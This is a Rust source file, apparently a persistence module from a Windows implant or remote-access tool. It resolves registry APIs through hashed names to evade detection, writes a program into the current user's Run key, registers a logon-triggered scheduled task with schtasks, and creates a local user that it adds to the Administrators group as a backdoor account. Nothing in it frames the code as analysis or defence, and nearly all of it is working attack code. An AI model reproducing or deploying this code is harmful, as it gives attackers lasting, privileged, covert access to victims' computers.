#[cfg(target_os = "windows")]
use alloc::vec::Vec;
use alloc::format;

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::*;

pub struct Persistence;

impl Persistence {
    pub fn install_registry_run(&self, name: &str, path: &str) -> Result<(), ()> {
        #[cfg(target_os = "windows")]
        unsafe {
            let advapi32 = hash_str(b"advapi32.dll");
            let reg_open = resolve_function(advapi32, hash_str(b"RegOpenKeyExA"));
            let reg_set = resolve_function(advapi32, hash_str(b"RegSetValueExA"));
            let reg_close = resolve_function(advapi32, hash_str(b"RegCloseKey"));

            if reg_open.is_null() || reg_set.is_null() { return Err(()); }

            type FnRegOpenKeyExA = unsafe extern "system" fn(HANDLE, *const u8, u32, u32, *mut HANDLE) -> i32;
            type FnRegSetValueExA = unsafe extern "system" fn(HANDLE, *const u8, u32, u32, *const u8, u32) -> i32;
            type FnRegCloseKey = unsafe extern "system" fn(HANDLE) -> i32;

            let mut h_key: HANDLE = core::ptr::null_mut();
            // HKEY_CURRENT_USER = 0x80000001
            let h_hkey_current_user = 0x80000001 as HANDLE;
            let subkey = b"Software\\Microsoft\\Windows\\CurrentVersion\\Run\0";

            let res = core::mem::transmute::<_, FnRegOpenKeyExA>(reg_open)(
                h_hkey_current_user,
                subkey.as_ptr(),
                0,
                0x20006, // KEY_WRITE
                &mut h_key
            );

            if res != 0 { return Err(()); }

            let mut name_c = Vec::from(name.as_bytes()); name_c.push(0);
            let mut path_c = Vec::from(path.as_bytes()); path_c.push(0);

            core::mem::transmute::<_, FnRegSetValueExA>(reg_set)(
                h_key,
                name_c.as_ptr(),
                0,
                1, // REG_SZ
                path_c.as_ptr(),
                path_c.len() as u32
            );

            core::mem::transmute::<_, FnRegCloseKey>(reg_close)(h_key);
            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = name;
            let _ = path;
            Err(())
        }
    }

    pub fn install_scheduled_task(&self, name: &str, path: &str) -> Result<(), ()> {
        let shell = crate::modules::shell::Shell;
        // Simplified scheduled task via shell
        // Note: Requires shell module to be robust
        let cmd = format!("schtasks /create /sc onlogon /tn \"{}\" /tr \"{}\" /f", name, path);
        let _ = shell.exec(&cmd);
        Ok(())
    }

    pub fn create_user(&self, username: &str, password: &str) -> Result<(), ()> {
        let shell = crate::modules::shell::Shell;
        let cmd = format!("net user {} {} /add", username, password);
        let _ = shell.exec(&cmd);
        let cmd_group = format!("net localgroup Administrators {} /add", username);
        let _ = shell.exec(&cmd_group);
        Ok(())
    }
}